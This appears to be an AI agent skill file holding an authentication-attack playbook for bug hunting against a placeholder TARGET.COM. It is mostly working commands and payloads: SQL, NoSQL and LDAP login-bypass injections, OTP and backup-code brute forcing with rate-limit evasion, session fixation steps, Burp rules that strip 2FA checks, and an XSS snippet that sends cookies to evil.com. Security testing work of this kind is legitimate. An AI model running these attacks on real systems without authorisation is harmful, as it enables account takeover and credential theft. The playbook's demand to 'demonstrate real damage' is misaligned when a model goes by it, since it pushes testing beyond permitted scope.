---
name: auth-bypass-session
description: Authentication bypass, session hijacking, cookie security, OAuth/SSO bypass, 2FA bypass, and login bypass techniques — use when testing auth flows, session management, or credential handling.
---

# Authentication Bypass & Session Attack Playbook

## Authentication Bypass Techniques

### Direct Endpoint Access
Try accessing protected resources directly without authentication.

**Test cases:**
```bash
# Try common admin paths
for path in /admin /admin/ /api/admin /admin.php /admin.html /dashboard /control-panel /management; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "https://TARGET.COM${path}"
done

# Bypass path traversal in auth checks
curl -s -o /dev/null -w "%{http_code}\n" "https://TARGET.COM/bypass/../admin"
curl -s -o /dev/null -w "%{http_code}\n" "https://TARGET.COM/./admin"
curl -s -o /dev/null -w "%{http_code}\n" "https://TARGET.COM//admin"
curl -s -o /dev/null -w "%{http_code}\n" "https://TARGET.COM/%2e%2e/admin"
curl -s -o /dev/null -w "%{http_code}\n" "https://TARGET.COM/admin%00"
```

**Burp config:** Add these paths to Intruder wordlist for directory brute force.

### Parameter Tampering
Inject auth-related parameters to escalate privileges.

```bash
# Role/admin parameter injection
curl -s -w "\n%{http_code}" "https://TARGET.COM/profile?admin=true"
curl -s -w "\n%{http_code}" "https://TARGET.COM/profile?role=admin"
curl -s -w "\n%{http_code}" "https://TARGET.COM/profile?isAdmin=1"
curl -s -w "\n%{http_code}" "https://TARGET.COM/profile?userType=admin"

# JSON body manipulation
curl -s -X POST "https://TARGET.COM/api/user" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","role":"admin","isAdmin":true}'

# Array type confusion
curl -s -w "\n%{http_code}" "https://TARGET.COM/profile?id[]=admin"
curl -s -w "\n%{http_code}" "https://TARGET.COM/profile?role[]=admin"
```

### HTTP Method Manipulation
Protected actions may only check POST, not GET.

```bash
# If DELETE/POST is protected, try GET
curl -s -X GET "https://TARGET.COM/api/delete-account"
curl -s -X GET "https://TARGET.COM/api/admin/users/delete?id=1"

# Try OPTIONS to discover allowed methods
curl -s -X OPTIONS -I "https://TARGET.COM/api/admin" -D -

# Try TRACE for cross-site tracing
curl -s -X TRACE "https://TARGET.COM/api/admin"
```

### JSONP/CORS Misconfiguration
Steal tokens via cross-origin requests.

```bash
# Check for JSONP callback parameter
curl -s "https://TARGET.COM/api/user?callback=alert(1)"

# Check CORS headers
curl -s -H "Origin: https://evil.com" -I "https://TARGET.COM/api/user" | grep -i "access-control"

# Test wildcard CORS
curl -s -H "Origin: https://evil.com" -I "https://TARGET.COM/api/user" | grep "Access-Control-Allow-Origin"
```

**Burp config:** Add `Origin: https://evil.com` header to all requests to test CORS bypass.

### Race Condition on Login
TOCTOU in authentication checks.

```bash
# Send multiple login requests simultaneously
for i in $(seq 1 10); do
  curl -s -X POST "https://TARGET.COM/login" \
    -d "username=admin&password=guess" &
done
wait

# Race password reset + login
# Step 1: Request password reset
curl -s -X POST "https://TARGET.COM/forgot-password" -d "email=admin@target.com" &
# Step 2: Immediately use reset token before it expires
# Step 3: Login with new password
```

### Type Confusion
Send arrays instead of strings to bypass checks.

```bash
# Array instead of string
curl -s "https://TARGET.COM/api/user?id[]=admin"
curl -s "https://TARGET.COM/api/user?role[]=admin"
curl -s -X POST "https://TARGET.COM/api/user" \
  -H "Content-Type: application/json" \
  -d '{"id":["admin"],"role":["admin"]}'

# Boolean confusion
curl -s "https://TARGET.COM/api/user?isAdmin[]=true"
curl -s "https://TARGET.COM/api/user?isAdmin[0]=true"
```

## Session Attacks

### Session Fixation
Set session cookie before login, force victim to authenticate with attacker's session.

```bash
# Step 1: Get a session cookie
SESSION=$(curl -s -c - "https://TARGET.COM/login" | grep session | awk '{print $NF}')

# Step 2: Send this session cookie to victim (via phishing/link)
# Victim logs in with this session cookie

# Step 3: Attacker uses the same session cookie
curl -s -b "session=${SESSION}" "https://TARGET.COM/dashboard"
```

**Burp config:** Use "Match and Replace" to inject a fixed session cookie:
- Match: `Cookie: session=(.*)`
- Replace: `Cookie: session=ATTACKER_FIXED_SESSION`

### Session Hijacking
Steal and reuse session tokens.

```bash
# Check if session token is in URL
curl -s "https://TARGET.COM/dashboard" | grep -o "session=[a-zA-Z0-9]*"

# Check referer leakage
curl -s -H "Referer: https://TARGET.COM/dashboard?session=LEAKED_TOKEN" "https://TARGET.COM/"

# Session token in error messages
curl -s "https://TARGET.COM/api/user/INVALID_SESSION"

# Session token in logs (check response headers)
curl -s -v "https://TARGET.COM/dashboard" 2>&1 | grep -i "set-cookie"
```

**XSS to steal cookies:**
```html
<script>
  new Image().src = "https://evil.com/steal?cookie=" + document.cookie;
</script>
```

### Weak Session Generation
Predictable session tokens.

```bash
# Collect multiple session tokens
for i in $(seq 1 5); do
  curl -s -c - "https://TARGET.COM/login" | grep session | awk '{print $NF}'
done

# Check if tokens are sequential or timestamp-based
# Look for patterns: base64 decode, hex patterns, short length

# Brute force short session tokens
ffuf -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/session-tokens.txt -u "https://TARGET.COM/dashboard" -H "Cookie: session=FUZZ" -mc 200,302
```

### Session Token Not Rotated
Token stays the same before and after login.

```bash
# Get pre-auth session
PRE_AUTH=$(curl -s -c - "https://TARGET.COM/login" | grep session | awk '{print $NF}')

# Login with credentials
curl -s -b "session=${PRE_AUTH}" -c - -X POST "https://TARGET.COM/login" \
  -d "username=admin&password=admin" | grep session

# If same session ID is returned, token not rotated
```

### Session Token Not Invalidated on Logout
Token remains valid after logout.

```bash
# Login and get session
SESSION=$(curl -s -c - -X POST "https://TARGET.COM/login" -d "username=admin&password=admin" | grep session | awk '{print $NF}')

# Logout
curl -s -b "session=${SESSION}" "https://TARGET.COM/logout"

# Try using session after logout
curl -s -b "session=${SESSION}" "https://TARGET.COM/dashboard" -w "\n%{http_code}"
# If 200, session not invalidated
```

## Cookie Security Testing

### Cookie Flag Checks
```bash
# Check all cookies for security flags
curl -s -v "https://TARGET.COM/login" 2>&1 | grep -i "set-cookie"

# Check Secure flag (should be present)
# Check HttpOnly flag (should be present)
# Check SameSite (should be Lax or Strict)
# Check Domain scope (should not be too broad)
# Check Path scope (should not be too broad)
# Check cookie prefix (__Secure-, __Host-)

# Test cookie tossing (set cookie with broader domain)
curl -s -H "Cookie: session=TOSSED_VALUE; Domain=.target.com" "https://TARGET.COM/dashboard"
```

**Burp config:** Add "Match and Replace" rules to strip security flags for testing:
- Match: `Set-Cookie: (.*); Secure` → Replace: `Set-Cookie: $1`
- Match: `Set-Cookie: (.*); HttpOnly` → Replace: `Set-Cookie: $1`

### Automated Cookie Testing
```bash
# Use curl to extract and analyze all cookies
curl -s -c - "https://TARGET.COM/login" | while read domain flag path name value; do
  echo "Domain: $domain, Path: $path, Name: $name, Value: $value"
done
```

## OAuth 2.0 / SSO Bypass

### Missing State Parameter
CSRF on OAuth flow.

```bash
# Test if state parameter is required
curl -s "https://TARGET.COM/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://evil.com/callback" -w "\n%{http_code}"

# If no error about missing state, CSRF is possible
# Craft malicious link:
# https://TARGET.COM/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://evil.com/callback
```

### PKCE Missing
Authorization code interception.

```bash
# Check if code_challenge is required
curl -s "https://TARGET.COM/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://app.com/callback&response_type=code" -w "\n%{http_code}"

# If code is returned without PKCE, intercept the code and exchange it
# Step 1: Get code via phishing/interception
# Step 2: Exchange code for token
curl -s -X POST "https://TARGET.COM/oauth/token" \
  -d "grant_type=authorization_code&code=INTERCEPTED_CODE&client_id=CLIENT_ID&redirect_uri=https://app.com/callback"
```

### Redirect URI Manipulation
```bash
# Try open redirect in redirect_uri
curl -s "https://TARGET.COM/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/redirect?url=https://evil.com" -w "\n%{http_code}"

# Try path traversal in redirect_uri
curl -s "https://TARGET.COM/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/../evil.com" -w "\n%{http_code}"

# Try subdomain takeover in redirect_uri
curl -s "https://TARGET.COM/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://subdomain.target.com" -w "\n%{http_code}"
```

### Token Replay Across Tenants
```bash
# Get token from tenant A
TOKEN_A=$(curl -s -X POST "https://tenant-a.target.com/oauth/token" -d "client_id=ID&client_secret=SECRET&grant_type=client_credentials" | jq -r .access_token)

# Try using token on tenant B
curl -s -H "Authorization: Bearer ${TOKEN_A}" "https://tenant-b.target.com/api/user" -w "\n%{http_code}"
```

### Token Type Confusion
```bash
# Try using ID token as access token
curl -s -H "Authorization: Bearer ${ID_TOKEN}" "https://TARGET.COM/api/user" -w "\n%{http_code}"

# Try using access token as ID token
curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" "https://TARGET.COM/userinfo" -w "\n%{http_code}"
```

## 2FA Bypass

### Direct Access After Initial Login
```bash
# Login and get session, then access protected endpoint directly
SESSION=$(curl -s -c - -X POST "https://TARGET.COM/login" -d "username=admin&password=admin" | grep session | awk '{print $NF}')

# Try accessing 2FA-protected endpoint
curl -s -b "session=${SESSION}" "https://TARGET.COM/2fa/verify" -w "\n%{http_code}"

# Try bypassing 2FA step
curl -s -b "session=${SESSION}" "https://TARGET.COM/dashboard" -w "\n%{http_code}"
```

### OTP Brute Force
```bash
# No rate limit check
for code in $(seq 000000 999999); do
  RESULT=$(curl -s -X POST "https://TARGET.COM/2fa/verify" -d "code=${code}&session=${SESSION}")
  if echo "$RESULT" | grep -q "success\|dashboard\|welcome"; then
    echo "Found code: ${code}"
    break
  fi
done

# Use hydra for faster brute force
hydra -l admin -P C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/otp-codes.txt TARGET.COM http-post-form "/2fa/verify:code=^PASS&:session=${SESSION}"
```

### OTP in Response (Leaked in JSON)
```bash
# Check if OTP is returned in API response
curl -s -X POST "https://TARGET.COM/2fa/send" -d "username=admin" | jq .

# Check if OTP is in response headers
curl -s -v -X POST "https://TARGET.COM/2fa/send" -d "username=admin" 2>&1 | grep -i "otp\|2fa\|code"
```

### OTP via Referer
```bash
# Check if OTP is passed in URL (referer leakage)
curl -s -H "Referer: https://TARGET.COM/2fa/verify?code=123456" "https://TARGET.COM/" -w "\n%{http_code}"
```

### Backup Code Brute Force
```bash
# Try common backup codes
for code in $(cat C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/backup-codes.txt); do
  curl -s -X POST "https://TARGET.COM/2fa/backup" -d "code=${code}&session=${SESSION}" -w "\n%{http_code}"
done
```

### Rate Limit Bypass
```bash
# IP rotation
for ip in $(cat C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/proxy-ips.txt); do
  curl -s --interface "${ip}" -X POST "https://TARGET.COM/2fa/verify" -d "code=${code}&session=${SESSION}"
done

# Header manipulation
curl -s -H "X-Forwarded-For: 1.2.3.4" -X POST "https://TARGET.COM/2fa/verify" -d "code=${code}&session=${SESSION}"
curl -s -H "X-Real-IP: 1.2.3.4" -X POST "https://TARGET.COM/2fa/verify" -d "code=${code}&session=${SESSION}"
```

## Login Bypass

### SQL Injection in Login
```bash
# Classic auth bypass
curl -s -X POST "https://TARGET.COM/login" -d "username=admin' OR '1'='1&password=anything"

# Comment-based bypass
curl -s -X POST "https://TARGET.COM/login" -d "username=admin'--&password=anything"
curl -s -X POST "https://TARGET.COM/login" -d "username=admin'#&password=anything"

# Union-based
curl -s -X POST "https://TARGET.COM/login" -d "username=' UNION SELECT 1,'admin','password'--&password=anything"

# Use sqlmap
sqlmap -u "https://TARGET.COM/login" --data="username=admin&password=pass" --batch --level 3 --risk 2
```

### NoSQL Injection in Login
```bash
# MongoDB-style
curl -s -X POST "https://TARGET.COM/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"anything"}}'

# Regex-based
curl -s -X POST "https://TARGET.COM/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'
```

### LDAP Injection in Login
```bash
# Bypass LDAP auth
curl -s -X POST "https://TARGET.COM/login" -d "username=admin*)(uid=*))|(&&password=anything"
curl -s -X POST "https://TARGET.COM/login" -d "username=admin*)(uid=*&password=anything"
```

### XML Injection (SOAP) in Login
```xml
<!-- XXE in SOAP login -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login>
      <Username>admin</Username>
      <Password>anything</Password>
    </Login>
  </soap:Body>
</soap:Envelope>
```

### Mass Assignment in Login
```bash
# Inject admin flag during registration/login
curl -s -X POST "https://TARGET.COM/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","isAdmin":true,"role":"admin"}'

curl -s -X POST "https://TARGET.COM/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin","isAdmin":true}'
```

### Response Manipulation
```bash
# Intercept response and remove 2FA requirement
# In Burp: Intercept response -> Modify JSON to remove "requires_2fa": true

# Use Burp match and replace to strip 2FA requirement
# Match: "requires_2fa": true
# Replace: "requires_2fa": false
```

## Tools & Configurations

### Burp Suite Config
```json
{
  "match_and_replace": [
    {
      "match": "Set-Cookie: (.*); Secure",
      "replace": "Set-Cookie: $1"
    },
    {
      "match": "Set-Cookie: (.*); HttpOnly",
      "replace": "Set-Cookie: $1"
    },
    {
      "match": "\"requires_2fa\": true",
      "replace": "\"requires_2fa\": false"
    },
    {
      "match": "Cookie: session=(.*)",
      "replace": "Cookie: session=ATTACKER_SESSION"
    }
  ]
}
```

### Automated Testing Script
```bash
#!/bin/bash
# auth-bypass-test.sh
TARGET=$1
SESSION=$2

echo "=== Authentication Bypass Tests ==="

# Direct access
for path in /admin /api/admin /dashboard; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://${TARGET}${path}")
  echo "[Direct] ${path}: ${CODE}"
done

# Parameter tampering
for param in admin=true role=admin isAdmin=1; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://${TARGET}/profile?${param}")
  echo "[Param] ${param}: ${CODE}"
done

# Method manipulation
for method in GET OPTIONS TRACE; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X "${method}" "https://${TARGET}/api/admin")
  echo "[Method] ${method}: ${CODE}"
done

# Session tests
if [ -n "$SESSION" ]; then
  # Logout then reuse session
  curl -s "https://${TARGET}/logout" -b "session=${SESSION}"
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://${TARGET}/dashboard" -b "session=${SESSION}")
  echo "[Session] Post-logout reuse: ${CODE}"
fi

echo "=== Done ==="
```

### Cookie Analysis
```bash
# Extract and analyze cookies
curl -s -c - "https://TARGET.COM/login" | while read line; do
  echo "$line" | awk '{
    if ($6 ~ /Secure/) print "Secure: YES"; else print "Secure: NO"
    if ($6 ~ /HttpOnly/) print "HttpOnly: YES"; else print "HttpOnly: NO"
    if ($6 ~ /SameSite/) print "SameSite: " $6; else print "SameSite: NOT SET"
  }'
done
```

## Key Indicators of Vulnerability

| Finding | Severity | Indicator |
|---------|----------|-----------|
| Admin page accessible without auth | Critical | HTTP 200 on /admin without login |
| Session not rotated on login | High | Same session ID before/after auth |
| Session valid after logout | High | HTTP 200 on protected page after logout |
| Missing cookie flags | Medium | No Secure/HttpOnly/SameSite |
| 2FA bypassable | High | Access protected resource without 2FA |
| OAuth state missing | High | No error on missing state parameter |
| PKCE missing | High | Code exchange without code_verifier |
| Predictable session tokens | High | Sequential or timestamp-based tokens |
| Mass assignment in auth | Critical | isAdmin accepted in registration |
| SQLi in login | Critical | Auth bypass with `' OR '1'='1` |

## Impact Demonstration

Every finding must demonstrate real damage:
- **Auth bypass**: Access admin panel, view other users' data
- **Session fixation**: Hijack victim's session after login
- **2FA bypass**: Access account without 2FA code
- **OAuth bypass**: Steal authorization codes, impersonate users
- **Cookie theft**: Session hijacking via XSS or referer leakage
- **Login bypass**: Full account access without credentials
